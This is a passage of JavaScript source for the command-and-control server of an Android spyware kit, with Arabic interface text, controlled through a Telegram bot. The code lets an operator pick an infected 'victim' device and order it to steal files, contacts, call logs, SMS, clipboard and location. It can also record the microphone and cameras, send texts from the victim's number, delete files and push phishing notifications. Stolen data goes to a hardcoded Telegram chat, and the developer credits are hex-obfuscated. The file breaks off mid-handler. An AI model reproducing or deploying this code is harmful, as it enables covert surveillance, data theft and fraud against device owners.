const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");
const CryptoJS = require('crypto-js');
const token = '8954843234:AAEvr6t-pYILp7ZbmpvCU1DcnKIDLTfVaEU'
const id = '8085880852'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

let currentNumber = '';
let currentUuid = '';
let currentTitle = '';

// أضف الكود هنا
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
    parameterLimit: 50000
}));

const upload = multer({
    limits: {
        fileSize: 50 * 1024 * 1024 // 50 ميجابايت
    }
});
// نهاية الكود المضاف

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاخ   تشغيل البوت بواسطة الخال قصي لوحة تحكم كاملة</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• موديل الجهاز : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• نظام الاندرويد : <b>${version}</b>\n` +
        `• سطوح الشاشة : <b>${brightness}</b>\n` +
        `• مزود : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• لا يوجد جهاز متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬00905317327802 واتساب المطور", ""],
        ["📢  https://t.me/Qsui123القناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", ""],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور الهكر الغامض شخصيا 😴 معرف المطور @VIP_MFM ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
                '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];

            appBot[_0x2f4e[0x0]](id,
                _0x2f4e[0x1] +
                _0x2f4e[0x2],
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
    }
    const _0x1f2d=['\x69\x64','\x74\x65\x78\x74','\x2f\x73\x74\x61\x72\x74','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0645\u0631\u062d\u0628\u0627\x20\u0628\u0643\u0645\x20\u0641\u064a\x20\u0628\u0648\u062a\x20\u0627\u0644\u0627\u062e\u062a\u0631\u0627\u0642\x20\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0628\u0648\u062a\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x0a\x0a','\u2022\x20\u0625\u0630\u0627\x20\u0643\u0627\u0646\x20\u0627\u0644\u062a\u0637\u0628\u064a\u0642\x20\u0645\u062b\u0628\u062a\u064b\u0627\x20\u0639\u0644\u0649\x20\u0627\u0644\u062c\u0647\u0627\u0632\x20\u0627\u0644\u0645\u0633\u062a\u0647\u062f\u0641\x20\u060c\x20\u0641\u0627\u0646\u062a\u0638\u0631\x20\u0627\u0644\u0627\u062a\u0635\u0627\u0644\x0a\x0a','\u2022\x20\u0639\u0646\u062f\u0645\u0627\x20\u062a\u062a\u0644\u0642\u0649\x20\u0631\u0633\u0627\u0644\u0629\x20\u0627\u0644\u0627\u062a\u0635\u0627\u0644\x20\u060c\x20\u0641\u0647\u0630\u0627\x20\u064a\u0639\u0646\u064a\x20\u0623\u0646\x20\u0627\u0644\u062c\u0647\u0627\u0632\x20\u0627\u0644\u0645\u0633\u062a\u0647\u062f\u0641\x20\u0645\u062a\u0635\u0644\x20\u0648\u062c\u0627\u0647\u0632\x20\u0644\u0627\u0633\u062a\u0644\u0627\u0645\x20\u0627\u0644\u0623\u0645\u0631\x0a\x0a','\u2022\x20\u0627\u0646\u0642\u0631\x20\u0639\u0644\u0649\x20\u0632\u0631\x20\u0627\u0644\u0623\u0645\u0631\x20\u0648\u062d\u062f\u062f\x20\u0627\u0644\u062c\u0647\u0627\u0632\x20\u0627\u0644\u0645\u0637\u0644\u0648\u0628\x20\u062b\u0645\x20\u062d\u062f\u062f\x20\u0627\u0644\u0623\u0645\u0631\x20\u0627\u0644\u0645\u0637\u0644\u0648\u0628\x20\u0628\u064a\u0646\x20\u0627\u0644\u0623\u0645\u0631\x0a\x0a','\u2022\x20\u0625\u0630\u0627\x20\u0639\u0644\u0642\u062a\x20\u0641\u064a\x20\u0645\u0643\u0627\u0646\x20\u0645\u0627\x20\u0641\u064a\x20\u0627\u0644\u0631\u0648\u0628\u0648\u062a\x20\u060c\x20\u0623\u0631\u0633\u0644\x20\x2f\x73\x74\x61\x72\x74\x20\x20\u0627\u0644\u0623\u0645\u0631\x20\u060c'];

if(chatId == id){
    if(message[_0x1f2d[0x1]]==_0x1f2d[0x2]){
        appBot[_0x1f2d[0x3]](id,
            _0x1f2d[0x4]+
            _0x1f2d[0x5]+
            _0x1f2d[0x6]+
            _0x1f2d[0x7]+
            _0x1f2d[0x8],
            {
                    parse_mode: "HTML",
                    "reply_markup": {
    "keyboard": [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "الخال قصي"],
        ["📢 قناة التليجرام"]
    ],
    'resize_keyboard': true
}
                }
            )
        }
        const _0x3f4d=['\x74\x65\x78\x74','\ud83d\udcac\x20\u0648\u0627\u062a\u0633\u0627\u0628\x20\u0627\u0644\u0645\u0637\u0648\u0631','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x61\x2e\x6d\x65\x2f\x39\x36\x37\x37\x37\x36\x30\x38\x30\x35\x31\x33','\ud83d\udcfa\x20\u0642\u0646\u0627\u0629\x20\u0627\u0644\u064a\u0648\u062a\u064a\u0648\u0628','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x75\x73\x65\x72\x2d\x61\x66\x65\x3f\x73\x69\x3d\x5f\x41\x2d\x7a\x35\x6a\x5a\x68\x50\x48\x4d\x34\x34\x64\x34\x33','\ud83d\udce2\x20\u0642\u0646\u0627\u0629\x20\u0627\u0644\u062a\u0644\u064a\u062c\u0631\u0627\u0645','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x6d\x75\x68\x5f\x37\x33\x39'];

if(message[_0x3f4d[0x0]]==_0x3f4d[0x1]){
    appBot[_0x3f4d[0x2]](id,_0x3f4d[0x3])
}

if(message[_0x3f4d[0x0]]==_0x3f4d[0x4]){
    appBot[_0x3f4d[0x2]](id,_0x3f4d[0x5])
}

if(message[_0x3f4d[0x0]]==_0x3f4d[0x6]){
    appBot[_0x3f4d[0x2]](id,_0x3f4d[0x7])
}
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                let text = '°• قائمة الاجهزة المتصلة :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                        `• البطارية : <b>${value.battery}</b>\n` +
                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
                        `• مزود : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'تنفيذ الامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
                        {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
                        {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
                        {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🚩الموقع', callback_data: `location:${uuid}`},
                        {text: '👹نخب', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال👤', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
                        {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
                        {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                        {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
